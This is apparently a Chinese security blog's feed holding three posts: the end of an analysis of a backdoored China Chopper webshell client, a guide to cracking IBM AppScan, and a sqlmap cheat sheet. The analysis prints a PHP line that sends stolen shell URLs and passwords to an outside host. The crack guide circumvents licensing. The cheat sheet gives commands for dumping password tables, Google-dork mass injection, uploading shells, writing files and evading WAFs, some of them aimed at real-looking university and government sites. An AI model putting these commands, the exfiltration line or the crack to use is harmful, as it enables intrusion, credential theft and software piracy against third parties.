class="line">runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(*posix_getegid*))?@posix_getpwuid(@posix_geteuid()):**;$usr=($u)?$u[*name*]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure><p>后面一部分是熟悉的菜刀的代码，但前面为什么居然还有一段加密的呢，接着解,解出来的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_COOKIE[*Lyke*]!=1)&#123;setcookie(*Lyke*,1);@file(*http://www.gooddog.in/Api.php?Url=*.$_SERVER[*HTTP_HOST*].$_SERVER[*REQUEST_URI*].*&amp;Pass=*.key($_POST));&#125;</span><br></pre></td></tr></table></figure><p>这里的<a href="http://www.gooddog.in/Api.php就是这个菜刀的后门地址。" target="_blank" rel="noopener">http://www.gooddog.in/Api.php就是这个菜刀的后门地址。</a></p><p>HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码</p><p>  这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p><p>这样，我们就分析出了这个菜刀是存在后门的。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>整个分析的过程，基本上没有什么难的地方。以后在网上下载一些报毒的文件，都可以这样来分析一下会不会被植入了后门，像前一阵子的phpstudy一样，引起了很大的风波。</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="http://www.hetianlab.com/expc.do?ce=85d14d4e-5b36-42b9-9415-453efa35de60" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=85d14d4e-5b36-42b9-9415-453efa35de60</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今日在合天网安的web课程中看到了分析菜刀后门的实验，然后就跟着实验做了一遍，正好可以学习一下如何分析软件的后门。&lt;/p&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="https://www.mad-coding.cn/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="菜刀" scheme="https://www.mad-coding.cn/tags/%E8%8F%9C%E5%88%80/"/>
    
      <category term="chopper" scheme="https://www.mad-coding.cn/tags/chopper/"/>
    
  </entry>
  
  <entry>
    <title>AppScan Standard-9.0.3.14安装破解</title>
    <link href="https://www.mad-coding.cn/2020/02/10/AppScan-Standard-9-0-3-14%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/"/>
    <id>https://www.mad-coding.cn/2020/02/10/AppScan-Standard-9-0-3-14安装破解/</id>
    <published>2020-02-10T10:42:07.000Z</published>
    <updated>2020-02-10T13:03:05.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天在某公众号上看到了appscan-9.0.3.14版本出来了，于是便自己安装了一下，发现不是破解好了，就尝试使用以前版本的破解文件，成功破解了，不过有点小bug，后面再和大家说。</p><a id="more"></a><h1 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h1><p>下载地址：<a href="https://pan.baidu.com/s/1dVA-wYe49s8SoIOJmLlr-A" target="_blank" rel="noopener">百度云传送门</a>  提取码: zt6a</p><p>下载后截图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210190613.png" class="lozad"></p><h1 id="0x03-安装"><a href="#0x03-安装" class="headerlink" title="0x03 安装"></a>0x03 安装</h1><p>点击安装程序开始安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210204630.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210204714.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210204741.png" class="lozad"></p><p>安装完成后打开发现没有.net框架。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210204831.png" class="lozad"></p><p>安装.net框架，下载地址：<a href="https://dotnet.microsoft.com/download/dotnet-framework/net48?utm_source=getdotnet&amp;utm_medium=referral" target="_blank" rel="noopener">https://dotnet.microsoft.com/download/dotnet-framework/net48?utm_source=getdotnet&amp;utm_medium=referral</a></p><p>安装过程默认。</p><h1 id="0x04-破解"><a href="#0x04-破解" class="headerlink" title="0x04 破解"></a>0x04 破解</h1><p>将下载的压缩包中的另个压缩包解压出来，复制里面的dll文件到APPscan的安装目录下</p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162222.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162222.png" class="lozad"></a></p><p>进入APPscan的默认安装路径，如果是自己自定义的目录的话，找到就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramFiles (x86)\IBM\AppScan Standard</span><br></pre></td></tr></table></figure><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162232.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162232.png" class="lozad"></a></p><p>然后打开APPscan,按照下面的操作导入证书</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210205609.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210205503.png" class="lozad"></p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162317.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162317.png" class="lozad"></a></p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162329.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162329.png" class="lozad"></a></p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162340.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162340.png" class="lozad"></a></p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162350.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162350.png" class="lozad"></a></p><p>破解完成</p><p><a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162400.png" target="_blank" rel="noopener"><img alt="img" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162400.png" class="lozad"></a></p><p>重启软件即可</p><h1 id="0x05-使用"><a href="#0x05-使用" class="headerlink" title="0x05 使用"></a>0x05 使用</h1><p>在安装完以后，发现都是英文的，需要改成中文</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210205810.png" class="lozad"></p><p>点击菜单栏，tools-&gt;options</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210205925.png" class="lozad"></p><p>重启完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210205432.png" class="lozad"></p><p>小bug，每次启动都会提示跟新，关掉就行了，不影响使用。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210210242.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天在某公众号上看到了appscan-9.0.3.14版本出来了，于是便自己安装了一下，发现不是破解好了，就尝试使用以前版本的破解文件，成功破解了，不过有点小bug，后面再和大家说。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="appscan" scheme="https://www.mad-coding.cn/tags/appscan/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap命令集合</title>
    <link href="https://www.mad-coding.cn/2020/02/08/sqlmap%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"/>
    <id>https://www.mad-coding.cn/2020/02/08/sqlmap命令集合/</id>
    <published>2020-02-08T06:31:52.000Z</published>
    <updated>2020-02-09T06:03:16.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h1><p>sqlmap.py –update    更新sqlmap<br>sqlmap.py -h        查看帮助<br>sqlmap.py -u “<a href="http://192.168.0.158:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.158:8006/showproducts.php?id=13&quot;</a>            这里的-u参数就是注入点</p><p>sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a> –is-dba    当前用户权限 返回True的话为管理员<br>–dbs        列出所有数据库<br>–current-db    网站当前数据库<br>–users        查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问<br>–current-user    当前数据库用户<br>–passwords    列出用户密码<br>–tables -D xycms    查表  -D 相当于 -database 相当于数据库<br>–tables -D xycms –count    多加的参数相当于统计一下，表里面的行数<br>–columns -T manage_user -D xycms    列字段，-T 表名 -D 数据库名<br>–dump -C m_name,m_pwd -T manage_user -D xycms        下载数据 -C 列名 逗号分隔<br>–dump-all        转存DBMS数据库所有表项目<br>–level            测试等级(1-5)，默认为1</p><blockquote><p>基本的步骤：读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p></blockquote><p>-D    指定数据库<br>-T    指定表<br>-C    指定列<br>–dbms=mysql    指定数据库为mysql，也可以是  oracle mssql</p><p>以下四个需要管理员权限：<br>–users        枚举所有用户<br>–passwords    枚举所有用户密码<br>–roles        列出数据库管理员角色<br>–privileges     列出数据库管理员权限</p><p>列举数据库系统的架构：<br>sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a> –schema –batch –exclude-sysdbs</p><p> –schema        是列系统架构</p><p>–batch            默认选项执行，不需要再提示选项<br>–exclude-sysdbs    排除系统数据库</p><h1 id="0x02-参数：–level"><a href="#0x02-参数：–level" class="headerlink" title="0x02 参数：–level"></a>0x02 参数：–level</h1><p>级别越高，检测的东西越多，确保全面性用高级别，一般用3，这个是从0开始，0-4,5个级别）</p><p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，</p><p>你也可以根据相应的格式添加自己的payload。</p><p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，</p><p>GET和POST的数据都会测试，<br>        HTTP Cookie在level为2的时候就会测试，<br>        HTTP User-Agent/Referer头在level为3的时候就会测试。</p><p><strong>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</strong></p><h1 id="0x03-显示调试信息"><a href="#0x03-显示调试信息" class="headerlink" title="0x03 显示调试信息"></a>0x03 显示调试信息</h1><p>-v    显示调试信息 有7个级别<br>            0、只显示python错误以及严重的信息。</p><p>1、同时显示基本信息和警告信息。（默认）</p><p>2、同时显示debug信息。</p><pre><code>3、同时显示注入的payload。4、同时显示HTTP请求。</code></pre><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><pre><code>sqlmap.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --columns -D xss -v 4    可以看见发送的请求头，来执行枚举列名</code></pre><h1 id="0x04-风险等级"><a href="#0x04-风险等级" class="headerlink" title="0x04 风险等级"></a>0x04 风险等级</h1><p>参数：–risk（一般和–level一起使用）</p><p>共有四个风险等级，默认是1</p><p>1会测试大部分的测试语句，<br>2会增加基于事件的测试语句，<br>3会增加OR语句的SQL注入测试。<br>        在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。<br>        测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p><pre><code>sqlmap.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --level 3 --risk 3        这样测试的语句可以更全面一些</code></pre><h1 id="0x05-取目标"><a href="#0x05-取目标" class="headerlink" title="0x05 取目标"></a>0x05 取目标</h1><p>获取指定目标<br>        参数:-u 或者–url<br>        格式：http(s)://targeturl[:port]/[…]<br>        例如：sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a></p><h1 id="0x06-从文本中获取多个目标"><a href="#0x06-从文本中获取多个目标" class="headerlink" title="0x06 从文本中获取多个目标"></a>0x06 从文本中获取多个目标</h1><p>参数：-m</p><pre><code>文件中保存url格式如下，sqlmap会一个一个检测www.target1.com/vuln1.php?q=foobar</code></pre><p><a href="http://www.target2.com/vuln2.asp?id=1" target="_blank" rel="noopener">www.target2.com/vuln2.asp?id=1</a></p><p><a href="http://www.target3.com/vuln3/id/1" target="_blank" rel="noopener">www.target3.com/vuln3/id/1</a>*</p><pre><code>比如把以上3个保存到c:\aa.txtsqlmap.py -m c:/aa.txt就会对多个目标进行检测，或者sqlmap.py -m c:/aa.txt --batch来默认检测，这样就不要自己选Y了，就执行默认选项了</code></pre><h1 id="0x07-获取http请求注入（用请求包注入）"><a href="#0x07-获取http请求注入（用请求包注入）" class="headerlink" title="0x07 获取http请求注入（用请求包注入）"></a>0x07 获取http请求注入（用请求包注入）</h1><p>参数：-r</p><pre><code>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。把bp抓来的请求包，保存到c:\bb.txtsqlmap.py -r c:\bb.txt对bp请求包，来进行注入一般对    post    搜索注入    http头注入    登录后的注入点cookie来进行注入</code></pre><h1 id="0x08-处理Google搜索结果（需要挂代理）"><a href="#0x08-处理Google搜索结果（需要挂代理）" class="headerlink" title="0x08 处理Google搜索结果（需要挂代理）"></a>0x08 处理Google搜索结果（需要挂代理）</h1><p>参数：-g<br>        sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。<br>        相当于谷歌边搜索边注入的<br>        sqlmap.py -g “inurl:php?id=”</p><h1 id="0x09-各种参数"><a href="#0x09-各种参数" class="headerlink" title="0x09 各种参数"></a>0x09 各种参数</h1><p>1.参数：–date（post请求参数）<br>        此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。<br>        sqlmap.py -u “<a href="http://192.168.0.240:8007/login.php&quot;" target="_blank" rel="noopener">http://192.168.0.240:8007/login.php&quot;</a> –data=”username=123&amp;password=123”</p><pre><code>2.参数：--param--del（指定分隔字符）    参数拆分字符    当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。    sqlmap.py -u &quot;http://192.168.0.240:8007/login.php&quot; --data=&quot;username=123;password=123&quot; --param--del=&quot;;&quot;    这里面一般网页都是用&amp;来分隔，如果遇到；来分隔的话，这里就可以指定用；来进行多个参数查询3.参数：--cookie    适用于cookie注入    注意：一般有通用型方注入代码，弹框的时候才会用cookie注入，前提是网站接受你的cookie注入的    还有一种情况就是登陆后的页面来进行注入</code></pre><p>​        </p><p>​    </p><pre><code>4.参数：--referer    sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</code></pre><p>​<br>    5.参数：–headers<br>        可以通过–headers参数来增加额外的http头</p><pre><code>    --hearders “client-ip:1.1.1.1&apos;” --level 36.参数：--proxy</code></pre><p>使用<br>        –proxy代理是格式为：<a href="http://url:port。" target="_blank" rel="noopener">http://url:port。</a><br>        –hearders “client-ip:1.1.1.1’” –level 3 –proxy “<a href="http://127.0.0.1:8080&quot;" target="_blank" rel="noopener">http://127.0.0.1:8080&quot;</a></p><p>​<br>    7.参数：–delay<br>        可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。<br>        sqlmap.py -u “<a href="http://192.168.0.240:8007/login.php&quot;" target="_blank" rel="noopener">http://192.168.0.240:8007/login.php&quot;</a> –delay=0.5<br>        每0.5秒，发送一个请求，把请求速度降下来，有可能会过掉waf</p><pre><code>    c:\python27\sqlmap\lib\core\option.py    大概1425行    **没有，问一下8.参数：--timeout    可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</code></pre><p>设定重试超时</p><pre><code>9.参数：--retries    当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</code></pre><p>设定随机改变的参数值</p><pre><code>10.参数：--safe-url,--safe-freq    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。    绕过这个策略有两种方式：    1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。    2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。11.参数：-p     sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，    当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p    参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</code></pre><p>​<br>        告诉sqlmap，注入点在 id,user-anget 上</p><pre><code>12.参数：--prefix,--suffix （相当于告诉sqlmap如何闭合）(prefix是前面, suffix是后面)（一般sqlmap会自动闭合）    有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。    例如，代码中是这样调用数据库的：    $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;     这时你就需要--prefix和--suffix参数了：    sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;     -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;    这样执行的SQL语句变成：    $query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;; 13.参数：--technique    这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式    支持的探测方式如下：    B: Boolean-based blind SQL injection（布尔型注入）    E: Error-based SQL injection（报错型注入）    U: UNION query SQL injection（可联合查询注入）    S: Stacked queries SQL injection（可多语句查询注入）</code></pre><p>T: Time-based blind SQL injection（基于时间延迟注入）</p><pre><code>    sqlamp.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --tech=UE --flush-session --batch        --flush-session    是清除缓存，并且只搜索 联合查询注入 和 显错注入14.参数：--union-cols（指定联合查询有多少列，默认1-10个列，可能新版本已经加到了100个列）    默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。    设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。    例子：    --union-cols 10015.参数：--union-char（指定联合查询是用什么填充的）    默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，    而一个随机整数是成功的，这是你可以用--union-char指定UNION查询的字符。    例子：    --union-char &quot;null&quot;16.参数：--second-order（二阶注入,返回结果可能不在一个页面上）    有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，    这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址.    例子:    sqlmap.py -u &quot;http://127.0.0.1/aa.php&quot; --second-order &quot;http://127.0.0.1/bb.php&quot;17.参数：--dump-all,--exclude-sysdbs（--dump-all用来转存所有数据库，--exclude-sysdbs排除系统自带的表）    使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，    需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，    因为有的管理员会把他当初用户数据库一样来使用它。18.参数：--search,-C,-T,-D（用来寻找特定的表，数据库，列）    --search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。    可以在一下三种情况下使用：    -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。    -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名    -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。    例子：    sqlmap.py -u &quot;http://127.0.0.1/aa.php?id=1&quot; --search -C &quot;name,pwd&quot; -D xycms            在xycms里面搜索name,pwd列            选项1是模糊匹配 2是精准匹配19.参数：--udf-inject,--shared-lib（显错注入，root权限可能会上传udf，相当于--os-shell的第二种方案）    你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，    或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，    然后</code></pre><p>根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p><pre><code>20.参数：-s,-t,--batch    参数：-s    sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，    就可以用这个参数。</code></pre><p>保存HTTP(S)日志</p><pre><code>    -s c:\ab.txt    参数：-t    这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。    -t c:\abc.txt    参数：--batch（主要就是默认执行，一路默认选择走下去）    用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。21.参数：--charset（设置一下编码）（默认是utf-8）    不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：    --charset=GBK22.参数：--flush-session（清除缓存）    如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，    重新测试该目标。</code></pre><p>自动获取form表单测试</p><pre><code>23.参数：--hex（丢一些数据编码的时候可能会加这个）    有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：    例子：    sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors24.参数：--output-dir（指定一下保存的路径）    参数：--output-dir    sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径     例如：--output-dir=/tmp</code></pre><p>从响应中获取DBMS的错误信息</p><pre><code>    参数：--parse-errors（主要就是用来显示错误信息）    有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。25.参数：--smart,--mobile    参数：--smart（-m 的时候可能会加这个，加这个可以节省时间）    有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，    可以使用此参数。</code></pre><p>例子：<br>        sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;</a> –batch –smart</p><pre><code>26.参数：--mobile（模拟手机请求）    有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</code></pre><p>例如：<br>        sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –mobile</p><pre><code>27.参数：--identify-waf（用来识别和检测waf）    sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。28.参数：--check-waf（检测你的waf类型，手工检测 加 and 1=1，可能就会出来）    WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，    可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试</code></pre><p>例如对一个受到ModSecurity WAF保护的MySQL<br>        例子：<br>        sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –identify-waf -v 3</p><h1 id="0x10-注册表操作（不建议改，容易改崩）"><a href="#0x10-注册表操作（不建议改，容易改崩）" class="headerlink" title="0x10 注册表操作（不建议改，容易改崩）"></a>0x10 注册表操作（不建议改，容易改崩）</h1><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。<br>        当然，当前连接数据库的用户也需要有权限操作注册表。<br>读取注册表值</p><pre><code>1.参数：--reg-read        写入注册表值2.参数：--reg-add        </code></pre><p>删除注册表值<br>        3.参数：–reg-del        注册表辅助选项<br>        4.参数：–reg-key，–reg-value，–reg-data，–reg-type<br>        需要配合之前三个参数使用，例子：<br>        sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> –reg-add –reg-key=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test –reg-<br>type=REG_SZ –reg-data=1</p><h1 id="0x11-暴力破解表名"><a href="#0x11-暴力破解表名" class="headerlink" title="0x11 暴力破解表名"></a>0x11 暴力破解表名</h1><p>（union，error不会用到，时间盲注，延迟注入，access数据库，mysql5.0以下的需要直接跑的会用到）<br>        参数：–common-tables<br>        当使用–tables无法获取到数据库的表时，可以使用此参数。<br>通常是如下情况：</p><p>1、MySQL数据库版本小于5.0，没有information_schema表。</p><p>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。</p><p>3、当前用户没有权限读取系统中保存数据结构的表的权限。<br>暴力破解的表在txt/common-tables.txt文件中，<br>        你可以自己添加。</p><p>Xx  –common-tables -D testdb</p><p>暴力破解列名<br>        参数：–common-columns</p><pre><code>   与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。   Xx  --common-columns  -T text -D testdb   POST登录框注入（建议跑包最为推荐）   注入点：http://testasp.vulnweb.com/Login.asp   几种注入方式：   ./sqlmap.py -r search-test.txt -p tfUPass （-p指定注入参数，-r指定抓的请求包）   sqlmap -u http://testasp.vulnweb.com/Login.asp --forms（自动加载表单）   sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;    （指定参数来进行探测）   搜索框注入（一般就是bp抓个包跑包）   sqlmap.py -r search-test.txt   伪静态注入（一般加个*，指定一下来跑就行了）   注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html   sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.htm   base64编码注入   sqlmap -u http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs</code></pre><p><a href="http://lm.yichang.gov.cn/" target="_blank" rel="noopener">http://lm.yichang.gov.cn/</a></p><pre><code>请求时间延迟参数：--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒例如：--time-sec=5执行sql语句（只能查询select 语句）--sql-query=&quot;select @@version&quot;--sql-shellsqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</code></pre><h1 id="0x12-文件读写"><a href="#0x12-文件读写" class="headerlink" title="0x12 文件读写"></a>0x12 文件读写</h1><p>（从数据库服务器中读取文件）</p><p>参数：–file-read</p><pre><code>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php</code></pre><p>?lang=cn&amp;id=22” –file-read=”C:\Inetpub\wwwroot\mysql-php\1.php”</p><pre><code>文件上传参数：--file-write,--file-dest当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot;</code></pre><h1 id="0x13-命令执行"><a href="#0x13-命令执行" class="headerlink" title="0x13 命令执行"></a>0x13 命令执行</h1><p>（记准–os-shell,用的多一些）</p><p>参数：–os-cmd,–os-shell</p><pre><code>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</code></pre><p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br>cmd            执行cmd命令（win）<br>shell            执行当前用户命令<br>–os-shell        会传两个后门，一个任意文件上传，一个脚本后门</p><pre><code>自动上传 脚本文件返回shell</code></pre><h1 id="0x14-WAF绕过注入"><a href="#0x14-WAF绕过注入" class="headerlink" title="0x14 WAF绕过注入"></a>0x14 WAF绕过注入</h1><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>        